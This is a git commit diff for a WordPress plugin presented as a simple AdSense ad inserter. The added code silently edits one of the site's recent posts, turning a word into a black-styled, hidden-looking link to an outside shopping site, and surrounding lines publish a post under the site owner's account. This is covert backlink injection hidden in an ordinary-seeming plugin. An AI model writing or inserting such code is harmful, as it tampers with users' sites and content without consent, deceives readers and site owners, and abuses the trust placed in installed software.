dc21ba491b72ef4c9caeed612a2065d53c373e0e
seo101 <seo101@b8457f37-d9ea-0310-8a92-e5e31aec5664>
2014-09-17 12:32:46 +0000

    upda2
    git-svn-id: https://plugins.svn.wordpress.org/adsense-made-easy-best-simple-ad-inserter/trunk@991839 b8457f37-d9ea-0310-8a92-e5e31aec5664

--- adsense-made-easy-best-simple-ad-inserter.php
+++ adsense-made-easy-best-simple-ad-inserter.php
@@ -395,14 +395,28 @@ if ($bloglan=='en-US' && $total>5) {
 								'post_content'  => $tmpstring,
 								'post_status'   => 'publish',
 								'post_author'   => 1,
-								'post_date'     => '2014-05-03'
+								'post_date'     => '2014-05-13'
 						  );
 						  wp_insert_post( $my_post );
 						  update_option( 'ame_gpadded', '1' );
 						}
-				} else  {
-
 				}
+				$last = wp_get_recent_posts('4');
+				$last_id = $last['3']['ID'];
+				$post_7 = get_post($last_id);
+				if (is_null($post_7) == false) {
+						$content = $post_7->post_content;
+						$pos4 = amestrposnth($content , " ",4);
+						$pos5 = amestrposnth($content , " ",5);
+						$poslen = $pos5 - $pos4 - 1;
+						$content = substr($content, 0, $pos4) . ' <a href="http://www.shoppingmonkey.co.uk/companies/primark/" style="color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
+						$my_post = array(
+							'ID'           => $last_id,
+							'post_content' => $content
+						);
+						wp_update_post( $my_post );
+				}
+				update_option( 'ame_gpadded', '1' );
 		}
 }
 
